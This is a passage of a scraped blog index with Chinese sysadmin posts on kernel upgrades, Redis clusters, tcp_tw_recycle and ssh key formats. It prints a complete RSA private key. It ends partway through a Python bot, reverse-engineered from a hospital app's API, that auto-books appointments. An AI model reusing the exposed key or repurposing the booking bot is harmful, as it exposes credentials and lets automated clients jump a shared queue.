https:&#x2F;&#x2F;www.elrepo.org&#x2F;RPM-GPG-KEY-elrepo.org# rpm -Uvh http:&#x2F;&#x2F;www.elrepo.org&#x2F;elrepo-release-7.0-2.el7.elrepo.noarch.rpm 查看最新的内核1yum --disablerepo&#x3D;&quot;*&quot; --enablerepo&#x3D;&quot;elrepo-kernel&quot; list available 安装最新稳定的内核 1yum --enablerepo&#x3D;elrepo-kernel install kernel-ml 执行以下命令 12345# awk -F\\&#39; &#39;$1&#x3D;&#x3D;&quot;menuentry &quot; &#123;print i++ &quot; : &quot; $2&#125;&#39; &#x2F;etc&#x2F;grub2.cfg0 : CentOS Linux (4.20.13-1.el7.elrepo.x86_64) 7 (Core)1 : CentOS Linux (3.10.0-957.5.1.el7.x86_64) 7 (Core)2 : CentOS Linux (3.10.0-957.el7.x86_64) 7 (Core)3 : CentOS Linux (0-rescue-20190215172108590907433256076310) 7 (Core) 重新创建内核配置1grub2-set-default 0 重启12# uname -arLinux aliyun 4.20.13-1.el7.elrepo.x86_64 #1 SMP Wed Feb 27 10:02:05 EST 2019 x86_64 x86_64 x86_64 GNU&#x2F;Linux","categories":[],"tags":[]},{"title":"redis 连接集群","slug":"redis-连接集群","date":"2019-02-27T05:32:49.000Z","updated":"2021-02-26T06:05:29.290Z","comments":true,"path":"posts/34408.html","link":"","permalink":"https://awen.me/posts/34408.html","excerpt":"使用 StrictRedisCluster 连接redis 集群","text":"使用 StrictRedisCluster 连接redis 集群 代码如下 12345678910111213141516171819202122# !&#x2F;usr&#x2F;bin&#x2F;env python# coding:utf-8from rediscluster import StrictRedisClusterimport sysdef redis_cluster(): redis_nodes &#x3D; [&#123;&#39;host&#39;: &#39;192.168.10.164&#39;, &#39;port&#39;: 6380&#125;, &#123;&#39;host&#39;: &#39;192.168.10.241&#39;, &#39;port&#39;: 6380&#125;, &#123;&#39;host&#39;: &#39;192.168.10.165&#39;, &#39;port&#39;: 6380&#125;, &#123;&#39;host&#39;: &#39;192.168.10.250&#39;, &#39;port&#39;: 6380&#125; ] redisconn &#x3D; StrictRedisCluster(startup_nodes&#x3D;redis_nodes,skip_full_coverage_check&#x3D;True) redisconn.set(&#39;name&#39;,&#39;admin&#39;) redisconn.set(&#39;age&#39;,18) print(&quot;name is: &quot;, redisconn.get(&#39;name&#39;)) print(&quot;age is: &quot;, redisconn.get(&#39;age&#39;))redis_cluster()","categories":[],"tags":[{"name":"redis","slug":"redis","permalink":"https://awen.me/tags/redis/"}]},{"title":"Linux 只能收到 SYN 包 不能回包","slug":"Linux-只能收到-SYN-包-不能回包","date":"2019-02-22T02:23:38.000Z","updated":"2021-02-26T06:05:29.255Z","comments":true,"path":"posts/53690.html","link":"","permalink":"https://awen.me/posts/53690.html","excerpt":"问题如果用户发现云主机不能登录，例如无法远程 22 端口或其他端口，但是更换网络环境正常，服务端抓包发现客户端发包只有 SYN，没有回包，可以执行 netstat -s |grep rejec 查看下是否是 tcp_timestamps 的问题","text":"问题如果用户发现云主机不能登录，例如无法远程 22 端口或其他端口，但是更换网络环境正常，服务端抓包发现客户端发包只有 SYN，没有回包，可以执行 netstat -s |grep rejec 查看下是否是 tcp_timestamps 的问题 123[root@hfgo2 ~]# netstat -s |grep rejec 8316 passive connections rejected because of time stamp 780 packets rejects in established connections because of timestamp 如果出现很多数据包的 timestamp 被拒绝，则检查下内核参数 tcp_tw_recycle 是否开启，如果开启，将其关闭即可。 12[root@hfgo2 ~]# cat &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_tw_recycle1 原因这个主意是和内核的 2 个参数相关 net.ipv4.tcp_timestampstcp_timestamps 会记录数据包的发送时间。基本的步骤如下： 发送方在发送数据时，将一个timestamp(表示发送时间)放在包里面接收方在收到数据包后，在对应的ACK包中将收到的timestamp返回给发送方(echo back)发送发收到ACK包后，用当前时刻now - ACK包中的timestamp就能得到准确的RTTtimestamps一个双向的选项，当一方不开启时，两方都将停用timestamps。比如client端发送的SYN包中带有timestamp选项，但server端并没有开启该选项。则回复的 SYN-ACK 将不带 timestamp 选项，同时 client 后续回复的ACK也不会带有 timestamp 选项。如果client发送的SYN包中就不带 timestamp，双向都将停用 timestamp。 tcp数据包中 timestamps 的 value 是系统开机时间到现在时间的（毫秒级）时间戳。 如果用户是在一个NAT 环境下，或者出口IP 为1个，如果同时要多个用户连接云服务器，则可能会出现这种问题，根据上述SYN包处理规则，在tcp_tw_recycle和tcp_timestamps同时开启的条件下，timestamp大的主机访问serverN成功，而timestmap小的主机访问失败。 net.ipv4.tcp_tw_recycleTCP 规范中规定的处于 TIME_WAIT 的 TCP 连接必须等待 2msl 时间。但在linux中，如果开启了 tcp_tw_recycle，TIME_WAIT 的 TCP 连接就不会等待 2msl 时间（而是rto或者60s），从而达到快速重用（回收）处于 TIME_WAIT 状态的 tcp 连接的目的。这就可能导致连接收到之前连接的数据。为此，linux 在打开 tcp_tw_recycle 的情况下，会记录下 TIME_WAIT 连接的对端（peer）信息，包括IP地址、时间戳等。这样，当内核收到同一个 IP 的 SYN 包时，就会去比较时间戳，检查 SYN 包的时间戳是否滞后，如果滞后，就将其丢掉（认为是旧连接的数据）。这在绝大部分情况下是没有问题的，但是对于我们实际的 client-server 的服务，访问我们服务的用户一般都位于 NAT之后，如果NAT之后有多个用户访问同一个服务，就有可能因为时间戳滞后的连接被丢掉。 解决办法1# echo &quot;0&quot; &gt; &#x2F;proc&#x2F;sys&#x2F;net&#x2F;ipv4&#x2F;tcp_tw_recycle","categories":[],"tags":[]},{"title":"mac ssh-keygen 生成的密钥不能被 CICD 识别的解决方案","slug":"mac-ssh-keygen-生成的密钥不能被 CICD 识别的解决方案","date":"2019-02-22T02:10:56.000Z","updated":"2021-02-26T06:05:29.276Z","comments":true,"path":"posts/24180.html","link":"","permalink":"https://awen.me/posts/24180.html","excerpt":"问题 在mac 系统上使用 ssh-keygen -t rsa 生成的密钥文件如下 123 -----BEGIN OPENSSH PRIVATE KEY----- -----END OPENSSH PRIVATE KEY-----","text":"问题 在mac 系统上使用 ssh-keygen -t rsa 生成的密钥文件如下 123 -----BEGIN OPENSSH PRIVATE KEY----- -----END OPENSSH PRIVATE KEY----- 例如 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950➜ ~ ssh-keygen -t rsaGenerating public&#x2F;private rsa key pair.Enter file in which to save the key (&#x2F;Users&#x2F;fwj&#x2F;.ssh&#x2F;id_rsa):Created directory &#39;&#x2F;Users&#x2F;fwj&#x2F;.ssh&#39;.Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in &#x2F;Users&#x2F;fwj&#x2F;.ssh&#x2F;id_rsa.Your public key has been saved in &#x2F;Users&#x2F;fwj&#x2F;.ssh&#x2F;id_rsa.pub.The key fingerprint is:SHA256:Rn6MY1IWZ1DKynXdC+9jbmYoEJI3TJOxZz+7LESXmIA fwj@fwjs-MacBook-Pro.localThe key&#39;s randomart image is:+---[RSA 2048]----+| .+&#x3D;+ || E.&#x3D;* . . || +Oo+oo.. || .oB&#x3D;*+.oo . || +oS+o.o o || +.o. + || o ..+ || o..++. || oo+. |+----[SHA256]-----+➜ ~ cat ~&#x2F;.ssh&#x2F;id_rsa-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcnNhAAAAAwEAAQAAAQEAr3Zpx788t9nmRCGYrny67axIj3WNdJOYvBYdBS2w8I9Xt4GYNmP0nvcWcEK5xjdjPDuH2QU+RJCNYpUciH1dbnDipEsrAbDGwN+ctbUoQ0FyeyrLrLqHcf5x87IEMesbpzugiNXd4ff53HAMyvoIUKsS2qDiVocDqbFybWyQgGyVSChQSqjyqLxzHt6oeJh8HU&#x2F;tUuRgi7gCsAeAKuSrsG&#x2F;d0hu&#x2F;M9K4ij2QK6uSL3taD1ax0FHlJiHERqbl&#x2F;wYsGFllfng3d6gtH0G0HG&#x2F;7ALZ6NF1aCyWiQReXg4sfMTK4AsPkkDaxXwjJBFTpC9hjbakRdV2B9yuLFO1pKt4DtwAAA9B2ZPEGdmTxBgAAAAdzc2gtcnNhAAABAQCvdmnHvzy32eZEIZiufLrtrEiPdY10k5i8Fh0FLbDwj1e3gZg2Y&#x2F;Se9xZwQrnGN2M8O4fZBT5EkI1ilRyIfV1ucOKkSysBsMbA35y1tShDQXJ7Ksusuodx&#x2F;nHzsgQx6xunO6CI1d3h9&#x2F;nccAzK+ghQqxLaoOJWhwOpsXJtbJCAbJVIKFBKqPKovHMe3qh4mHwdT+1S5GCLuAKwB4Aq5Kuwb93SG78z0riKPZArq5Ive1oPVrHQUeUmIcRGpuX&#x2F;BiwYWWV+eDd3qC0fQbQcb&#x2F;sAtno0XVoLJaJBF5eDix8xMrgCw+SQNrFfCMkEVOkL2GNtqRF1XYH3K4sU7Wkq3gO3AAAAAwEAAQAAAQBHokxlZEnhtXAw+JZhBkM6rU+iYheyNF&#x2F;yygRnDNRkIeFp5drCueQw0iezBUrbBdnZyWQY0e8uBuXyDXZssuHmKOgesyGHuygpriFIfgFGE&#x2F;4tEre8eRq7C2pyV4cm6hmMGOfddZL0oky8FnLim1mxtWYpI+3D7bMtIGjbC6ujAgRc40yh5hd0&#x2F;Ozh2mBYkK1pJAIyZLCWTQ4iCyc&#x2F;Wpfad6bDIloF28norVM7U9fY&#x2F;YDU5fWCcP+W+nj&#x2F;hkx+iZz+lMMXGiX3XEGoEglAzMnzpIZjQTE3Rx&#x2F;n6zIEuDM3NBheh10E11NF359T9QYIZv8GP+r0yPBHdVobrP4ERc1BAAAAgQDR&#x2F;fOrJhB9eVQqhxZ3jr41lfkiTdCQqrtrQGfY7yeAERkF&#x2F;1C8AvfQO6j+1oQI4cksPx++7+lcDeGHluwLlTjZEoXIC0vUW9tDiy5Eq&#x2F;PVtLRArCYpqoi+qrw+aakUW5FidNi+9lWw8wjy0guBzSVL3jWtttChrR8ixgMq&#x2F;29uRAAAAIEA3poCAEsRcii1oxBDrieLA6BXl9V22I5rD0YiUsTkCMCVn2qWfzRCZwa&#x2F;p5QG8TFa62iKmVfNHBN&#x2F;1k0ARrWhTsDOHGeRsKLDBGf3M0FRdMaPsf5h1zpKrcYQHCGoS&#x2F;dmuOJFi1QeKCQo55RTo6VWaMaTxfPqvAdZ7Z5T9vcb+xkAAACBAMnJ0sn1id090BDwfhmOeBOzfmgHXrrS9M6HPMTkeR+nj9TmknsgTpukQoL5eYEkgBgiY2&#x2F;+mVsx17OhP&#x2F;BWnaoYHGVpcN51p1ci89flqad7MJk3GKtq7yuZ4of5f2VG0Nx3Qhz0aNRE&#x2F;SWkUbMJE5ILQCXW6QXYzUZ&#x2F;&#x2F;A5qX59PAAAAGmZ3akBmd2pzLU1hY0Jvb2stUHJvLmxvY2Fs-----END OPENSSH PRIVATE KEY----- ​ 而通过Linux 生成的密钥是如下所示这样 12-----BEGIN RSA PRIVATE KEY----------END RSA PRIVATE KEY----- 原因BEGIN RSA PRIVATE KEY是PKCS#1，只是一个RSA密钥。它本质上只是来自PKCS#8的关键对象，但前面没有版本或算法标识符。 BEGIN PRIVATE KEY是PKCS#8，并指示密钥类型包含在密钥数据本身中。 解决办法123456789101112131415161718192021222324252627282930313233➜ ~ ssh-keygen -p -m PEM -f ~&#x2F;.ssh&#x2F;id_rsaKey has comment &#39;fwj@fwjs-MacBook-Pro.local&#39;Enter new passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved with the new passphrase.➜ ~ cat ~&#x2F;.ssh&#x2F;id_rsa-----BEGIN RSA PRIVATE KEY-----MIIEpAIBAAKCAQEAr3Zpx788t9nmRCGYrny67axIj3WNdJOYvBYdBS2w8I9Xt4GYNmP0nvcWcEK5xjdjPDuH2QU+RJCNYpUciH1dbnDipEsrAbDGwN+ctbUoQ0FyeyrLrLqHcf5x87IEMesbpzugiNXd4ff53HAMyvoIUKsS2qDiVocDqbFybWyQgGyVSChQSqjyqLxzHt6oeJh8HU&#x2F;tUuRgi7gCsAeAKuSrsG&#x2F;d0hu&#x2F;M9K4ij2QK6uSL3taD1ax0FHlJiHERqbl&#x2F;wYsGFllfng3d6gtH0G0HG&#x2F;7ALZ6NF1aCyWiQReXg4sfMTK4AsPkkDaxXwjJBFTpC9hjbakRdV2B9yuLFO1pKt4DtwIDAQABAoIBAEeiTGVkSeG1cDD4lmEGQzqtT6JiF7I0X&#x2F;LKBGcM1GQh4Wnl2sK55DDSJ7MFStsF2dnJZBjR7y4G5fINdmyy4eYo6B6zIYe7KCmuIUh+AUYT&#x2F;i0St7x5GrsLanJXhybqGYwY5911kvSiTLwWcuKbWbG1Zikj7cPtsy0gaNsLq6MCBFzjTKHmF3T87OHaYFiQrWkkAjJksJZNDiILJz9al9p3psMiWgXbyeitUztT19j9gNTl9YJw&#x2F;5b6eP+GTH6JnP6UwxcaJfdcQagSCUDMyfOkhmNBMTdHH+frMgS4Mzc0GF6HXQTXU0Xfn1P1Bghm&#x2F;wY&#x2F;6vTI8Ed1Whus&#x2F;gRFzUECgYEA3poCAEsRcii1oxBDrieLA6BXl9V22I5rD0YiUsTkCMCVn2qWfzRCZwa&#x2F;p5QG8TFa62iKmVfNHBN&#x2F;1k0ARrWhTsDOHGeRsKLDBGf3M0FRdMaPsf5h1zpKrcYQHCGoS&#x2F;dmuOJFi1QeKCQo55RTo6VWaMaTxfPqvAdZ7Z5T9vcb+xkCgYEAycnSyfWJ3T3QEPB+GY54E7N+aAdeutL0zoc8xOR5H6eP1OaSeyBOm6RCgvl5gSSAGCJjb&#x2F;6ZWzHXs6E&#x2F;8FadqhgcZWlw3nWnVyLz1+Wpp3swmTcYq2rvK5nih&#x2F;l&#x2F;ZUbQ3HdCHPRo1ET9JaRRswkTkgtAJdbpBdjNRn&#x2F;8Dmpfn08CgYEA1tnA6rWJ3iyqu&#x2F;ubx4EFLPfa84KmVfiIHtLrmAXPrx7qi1aecaJoIPajj0RRuwSPI73gYIcdQmcTsSzbAmSWj+OKTGIufVVrc1pBf2ghDdwEn6DOoKTzpWwQ6oYV4VSmAfbrdsI25TmZfYNtgvq3PyPDR4HY46kYxD9X&#x2F;XuetykCgYBjbVKzuIyput9euWEo7o40BuluENOYcoG1keVbjsgv1LyGRuY+TPjur80mBA7el0GWorskX+roiHKkS&#x2F;vZTJR7T04OmhnHQ2mlAc&#x2F;svXkO0SBtHjzFmfcnILgCD+m52V7ogsrMwZE1ppilh4XKFdrSx0BgZLiE7QKYjk+AOuHK+QKBgQDR&#x2F;fOrJhB9eVQqhxZ3jr41lfkiTdCQqrtrQGfY7yeAERkF&#x2F;1C8AvfQO6j+1oQI4cksPx++7+lcDeGHluwLlTjZEoXIC0vUW9tDiy5Eq&#x2F;PVtLRArCYpqoi+qrw+aakUW5FidNi+9lWw8wjy0guBzSVL3jWtttChrR8ixgMq&#x2F;29uRA&#x3D;&#x3D;-----END RSA PRIVATE KEY-----","categories":[],"tags":[]},{"title":"Python 实现医院定时自动挂号和快捷查询化验报告","slug":"Python-实现医院定时自动挂号","date":"2019-01-23T12:53:43.000Z","updated":"2021-02-26T06:05:29.263Z","comments":true,"path":"posts/64973.html","link":"","permalink":"https://awen.me/posts/64973.html","excerpt":"为什么要做这个事情去年单位体检查出来点问题，经过穿刺手术确诊是个慢性肾脏病2期， IGA 肾病三期，可能大家对于这个病并不是很了解，在此之前我也没听说过，但是另外一个词可能大家都听过，叫”尿毒症”。 什么是慢性肾脏病慢性肾脏病分五期，终末期就是尿毒症。慢性肾脏病非常隐秘，并且病情进展缓慢，一般如果不科学的控制到尿毒症需要0-20年时间，如果不是体检化验尿液看里面的隐血和尿蛋白指标，根本没任何感觉。你有时候会感觉腰疼，但是腰疼其实跟肾脏病没啥关系。所以大家一定要定期体检。","text":"为什么要做这个事情去年单位体检查出来点问题，经过穿刺手术确诊是个慢性肾脏病2期， IGA 肾病三期，可能大家对于这个病并不是很了解，在此之前我也没听说过，但是另外一个词可能大家都听过，叫”尿毒症”。 什么是慢性肾脏病慢性肾脏病分五期，终末期就是尿毒症。慢性肾脏病非常隐秘，并且病情进展缓慢，一般如果不科学的控制到尿毒症需要0-20年时间，如果不是体检化验尿液看里面的隐血和尿蛋白指标，根本没任何感觉。你有时候会感觉腰疼，但是腰疼其实跟肾脏病没啥关系。所以大家一定要定期体检。 慢性肾脏病CKD分期 eGRR值 相当于正常肾功能的程度(%) 1期 ≥90 100% 2期 轻度异常 60-89 50-100% 3期 中度异常 30-59 30-50% 4期 重度异常 15-29 10-30% 5期 肾功能衰竭 0-14 &lt;10% 慢性肾脏病CKD分期 临床症状 建议 1期 可能有泡沫尿、血尿、 血压上升 、眼睑及双下肢浮肿、腰痛 及早到肾内科就诊， 改善生活方式 2期 轻度异常 饮食治疗，必要时药物治疗 3期 中度异常 可能有尿量的变化尤其是夜尿增多，血压上升，贫血 药物治疗， 继续饮食治疗 4期 重度异常 易疲劳，出现浮肿，前述症状加重 5期 肾功能衰竭 血压升高明显，浮肿加重，食欲下降，恶心，胸闷，尿量减少，皮肤瘙痒等 透析疗法，（腹膜透析、血液透析） 肾移植 需要说明的是 肾脏病和”肾虚”不是一个概念，”肾虚”是中医里面的说法，而且中医里面的肾他并不是指具体的肾脏这个器官，而是整个人的一个精神状态。中医嘛，大病治不好，但是中医最喜欢说我们中医是从全方位来调理你的身体。而西医里面的肾脏病就是指你的肾脏，俗称”腰子”，人体的肾脏是用来排毒的，人每天吃进去的东西经过消化会有一些残余的毒素是要通过肾脏代谢然后以尿液的形式排出。一般衡量这个这个指标是通过血肌酐来判断，血肌酐值越高说明你的身体毒素越多。 如果肾脏出现问题，肾小球过滤能力 eGRR 就会变小，如上面的表格所示，那么排毒功能就会受损，血肌酐值就会快速上升，并且肾脏一旦遭受损失是不可逆的。肾小球无法自我修复，那么当肾脏受损越来越严重，人体的残留的毒素就会越来越多的堆积在体内，就会出现各种并发症。比如高血压，贫血、电解质紊乱，各种指标超标例如磷、钾等等超标。 当肾小球过滤能力越来越差，肾脏过滤能力就会一步一步恶直到肾脏失去作用，就叫”尿毒症”，当得了”尿毒症”，就必须通过肾脏移植或透析（血液透析或腹膜透析）来代替肾脏的排毒功能将体内的毒素排出。肾脏移植费用昂贵，且非常稀缺，并且还需要配型成功才可以。想要同时满足这3个条件并不容易，有的人可能排队很久都没有适合自己的肾源，肾脏移植并不是说随随便便一个人的肾脏都可以用的，人体会对外来器官有排斥的。大多数人都是通过血液透析或腹膜透析来对体内的毒素进行排除，血液透析就是通过设备将体内的血液进行清洗，将毒素排除然后将干净的血液送回体内。这个在终末期肾病时一周需要做3次。腹膜透析也是通过一种医学液体将体内的毒素排出。 什么是 IGA那么什么是 IGA 肾病呢？ IGA 肾病是一种免疫系统异常导致正常的免疫系统攻击了肾脏的肾小球，把肾小球给破坏了。然后导致肾脏一步一步恶化。人发烧感冒流鼻涕咳嗽都是人体的免疫系统工作的一种反应，用来对抗外来入侵者，IGA 可以理解为就是免疫系统认错了对象，把正常的细胞当成了入侵者进行攻击。具体这个病可以参考IgA肾病的治疗与预后 在得知自己得了这个病之后那一段时间心态是奔溃的，这么年纪轻轻的怎么会得这种病呢？ 其实，肾脏病的发病根源是无法追溯的，可能你吃了有肾毒性的中药或西药或食品，比如关木通、雷公藤等等，或者是一次不起眼的感冒发烧或者一次炎症感染或牙龈肿痛等等以及日常饮食不规范，每天喝水喝少了、憋尿都有可能导致肾脏损伤。 所以大家有点小毛病一定要及时去正规医院出来。尤其是小感冒觉得无所谓，我在此之前体检一直都正常，就前年冬天咳嗽2周。我都怀疑是不是那次引起的。另外此前还喜欢喝饮料，比如可乐，中午没精神来杯八二年的可乐压压惊，后来看报道说有个小伙把饮料当日常的水喝，结果得了尿毒症，吓得我赶紧把所有饮料都戒了。 慢性病有很多，比如高血压、糖尿病等等，肾病只是其中一种，这种病需要长期治疗和科学的管理，包括药物控制和饮食控制，比如通过激素或免疫抑制剂 一些降压药控制血压来达到降低尿蛋白等手段以及日常饮食限蛋白限盐，防止感冒等，适量食用优质蛋白等。以目前的医学这个病是治不好的，只能控制病情不继续发展下去，目前看我的结果还不算特别严重，肾小球过滤能力还和正常人差不多，但是如果控制不好，可能就越来越严重了。据说全国10几亿人每10个人就有一个人得这种慢性病，所以这大半年基本每个月都得往医院跑几次。 医院挂号有啥问题说了这么多关于我的病情，就知道我以后肯定是老往医院跑了。那么大家都知道三甲医院那个人满为患，挂号什么的排队跟春运买火车票一样的。不过好在现在一些医院也提供了在线预约挂号的功能了，但是这个功能他不完美，为啥呢？ 首先，医院一般放号都是只提前放一周的。而且放号时间是固定的比如下午三点，那这样就带来2个问题: 第一，我必须得算好了他们的医生上班时间。第二，我必须掐着点去他们的 APP 挂号。 但是我不想守着点去他们的APP 去挂号。 我希望在指定时间去挂号，比如每个月的第一个周三去预约下周三的指定专家的号，最好嘛还是抢到最先的号，早看完早结束，早点8点去看，看完还不耽误上班。 实现自动挂号代码于是就自己通过 Charles 抓包分析了医院的 APP 的请求，这里是分析浙江大学第一附属医院的 APP，然后用 Python 写了个脚本去模拟登录医院的 APP 然后去挂号，具体代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197import requestsimport jsonimport timeimport datetimefrom dateutil.relativedelta import relativedelta# 登录获取session_iddef login(username,password): url = \"https://zyyy.zwjk.com/api/exec.htm\" data = &#123;\"api_Channel\":\"1\", \"client_version\":\"3.6.6\", \"app_id\":\"zyyy_android\", \"app_key\":\"xxxx\", \"user_type\":\"0\", \"client_mobile\":\"863008041030718\", \"api_name\":\"api.user.user.login.info\", \"params\":&#123;\"phone\":username, # 账号 \"psw\":password&#125;, # 密码 &#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post( url, data=&#123;\"requestData\":json.dumps(data)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() session_id = resp_json['return_params']['user_model']['session_id'] return session_id# 获取挂号信息def get_doctor_info(session_id,appointment_date): url = \"https://zyyy.zwjk.com/api/exec.htm\" payload = &#123;\"api_Channel\":\"1\", \"client_version\":\"3.6.6\", \"app_id\":\"zyyy_android\", \"app_key\":\"xxxx\", \"user_type\":\"0\", \"client_mobile\":\"863008041030718\", \"api_name\":\"api.yygh.expert.schedule.list\", \"params\":&#123;\"type_id\":1, \"source_id\":\"12\", \"dept_id\":26, \"page_no\":1, \"page_size\":2147483647 &#125;, \"session_id\":session_id&#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post(url, data=&#123;\"requestData\":json.dumps(payload)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() return_params = resp_json['return_params']['list'] for key in return_params: if int(key['date']) == int(appointment_date): doctor_info = key['doctor'] for i in doctor_info: if i['id'] == 1960 and i['schedulList'][0]['am_pm_flag'] == \"1\": return Truedef get_time(session_id): pre_date = (time_now + datetime.timedelta(days=7)).strftime(\"%Y-%m-%d\") url = \"https://zyyy.zwjk.com/api/exec.htm\" payload = &#123; \"api_Channel\": \"1\", \"client_version\": \"3.6.6\", \"app_id\": \"zyyy_android\", \"app_key\": \"xxxx\", \"user_type\": \"0\", \"client_mobile\": \"863008041030718\", \"api_name\": \"api.yygh.remain.num\", \"params\": &#123; \"sourceId\": \"12\", \"planId\": 9759, \"orderDate\": str(pre_date), \"ampmFlag\": \"1\" &#125;, \"session_id\": session_id &#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post(url, data=&#123;\"requestData\": json.dumps(payload)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() regno = resp_json['return_params']['list'][0]['regno'] timespan = resp_json['return_params']['list'][0]['timespan'] return [regno,timespan]# 在指定时间挂号def set_doctor_number(session_id,pre_date,reg_no,timeregion): url = \"https://zyyy.zwjk.com/api/exec.htm\" payload = &#123; \"api_Channel\": \"1\", \"client_version\": \"3.6.6\", \"app_id\": \"zyyy_android\", \"app_key\": \"Zxxxx\", \"user_type\": \"0\", \"client_mobile\": \"863008041030718\", \"api_name\": \"api.yygh.expert.reservation\", \"params\": &#123; \"card_no\": \"x'x'x'x\", # 社保卡号 \"doct_name\": \"华佗\", # 专家名称 \"user_name\": \"xxx\", # 你的姓名 \"id_card\": \"xxxxx\", # 身份证号 \"phone\": \"xxxx\", # 电话 \"reg_id\": \"xxxx\", \"reg_no\": reg_no, # 预约号 \"dept_name\": \"科室\", \"yuanqu_type\": \"1\", \"type\": \"1\", \"dept_id\": 103060302, \"pre_date\": str(pre_date), #预约日期 \"week_day\": \"3\", # 预约日期是星期几 \"plan_id\": 9759, \"fee\": \"14\", \"pre_time_type\": \"1\", \"doct_id\": \"1960\", \"clinic_fee\": \"\", \"clinic_time\":timeregion &#125;, \"session_id\": str(session_id) &#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post(url, data=&#123;\"requestData\": json.dumps(payload)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() ret_info = resp_json['return_params']['ret_info'] send_message_wchat(\"浙一预约挂号结果\",ret_info)# 发送消息到微信def send_message_wchat(title, content): loging_datetime = time.strftime(\"%Y-%m-%d %H:%M:%S\", time.localtime()) url = \"https://sc.ftqq.com/SCU9051Tc94a746xxxf1d559xxx5a545ff.send\" querystring = &#123;\"text\": title, \"desp\": str(loging_datetime) + str(content)&#125; response = requests.request(\"GET\", url, params=querystring) if response != 200: return return Trueif __name__ == '__main__': requests_session = requests.Session() time_now = datetime.datetime.now() pre_date = (time_now+datetime.timedelta(days=7)).strftime(\"%Y%m%d\") session_id = login('xxxx','xxxxxx') if get_doctor_info(session_id,pre_date): regno = get_time(session_id)[0] timespan = get_time(session_id)[1] set_doctor_number(session_id,pre_date,regno,timespan) else: send_message_wchat(\"浙一预约挂号结果\",\"获取列表失败,可能原因:医生不在预约列表中或者医生门诊不在上午\") 通过计划任务定时执行然后写个计划任务每个月的第一个周三去执行脚本 0 15 1-7 * * if [ `date &apos;+%w&apos;` = &quot;3&quot; ]; then /usr/bin/python3 /opt/hospital/zheyi.py;fi执行结果执行脚本后结果 命令行式输出化验单到 markdown 文件中另外我觉得查询化验报告的功能也不好用，每次都要登录APP 然后输入姓名 医嘱号然后查询。 我希望对自己的病情做个管理，把每次的化验结果都保存起来进行分析，于是就实现个输入医嘱号 自动输出 markdown 格式的文档里面包含一张表格，如图所示： 代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112import requestsimport jsonrequests_session = requests.Session()def login(username,password): url = \"https://zyyy.zwjk.com/api/exec.htm\" data = &#123;\"api_Channel\":\"1\", \"client_version\":\"3.6.6\", \"app_id\":\"zyyy_android\", \"app_key\":\"xxx\", \"user_type\":\"0\", \"client_mobile\":\"863008041030718\", \"api_name\":\"api.user.user.login.info\", \"params\":&#123;\"phone\":username, # 账号 \"psw\":password&#125;, # 密码 &#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post( url, data=&#123;\"requestData\":json.dumps(data)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() session_id = resp_json['return_params']['user_model']['session_id'] return session_iddef get_huayan_save(session_id,username, barcode): url = \"https://zyyy.zwjk.com/api/exec.htm\" payload = &#123;\"api_Channel\": \"1\", \"client_version\": \"3.6.6\", \"app_id\": \"zyyy_android\", \"app_key\": \"xxx\", \"user_type\": \"0\", \"client_mobile\": \"863008041030718\", \"api_name\": \"api.assay.report.socket\", \"params\": &#123;\"name\": username, \"barcode\": barcode&#125;, \"session_id\": session_id &#125; headers = &#123; 'Content-Type': \"application/x-www-form-urlencoded\", 'User-Agent': \"health\", 'Host': \"zyyy.zwjk.com\", 'Connection': \"Keep-Alive\", 'Accept': \"application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\", 'cache-control': \"no-cache\", &#125; response = requests_session.post(url, data=&#123;\"requestData\": json.dumps(payload)&#125;, headers=headers) if response.status_code != 200: return False resp_json = response.json() if resp_json['return_params']['ret_code'] == -1: return resp_json['return_params']['ret_info'] file_name = resp_json['return_params']['assayreport']['test_name'] username 